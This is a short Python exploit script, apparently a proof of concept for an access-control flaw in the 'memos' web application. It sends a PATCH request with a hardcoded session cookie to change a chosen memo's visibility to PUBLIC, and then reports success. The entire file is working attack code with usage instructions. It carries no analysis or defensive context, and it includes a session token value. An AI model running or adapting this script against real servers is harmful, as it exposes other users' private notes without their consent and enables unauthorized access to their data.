import requests, sys

# example usage: python3 exploit.py <url> <memo ID>
memoID = sys.argv[2]
url = sys.argv[1] + "/api/memo/" + memoID
print("[+] Target URL: {0}\n[+]Target memo ID: {1}".format(url, memoID))

payload = {"id":memoID,"visibility":"PUBLIC","resourceIdList":[]}
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Cookie": "memos_session=MTY3MjAzNTU1NnxEdi1EQkFFQ180UUFBUkFCRUFBQUhfLUVBQUVHYzNSeWFXNW5EQWtBQjNWelpYSXRhV1FEYVc1MEJBTUFfOUk9fAbsrRwyHu0-o1lGKrtdHrlwm_FIroAbkHzgerk-DJ8l"
}

r = requests.patch(url, headers=headers, json=payload)
#print(r.text)
print("[+] Memo visibility changed to public!")
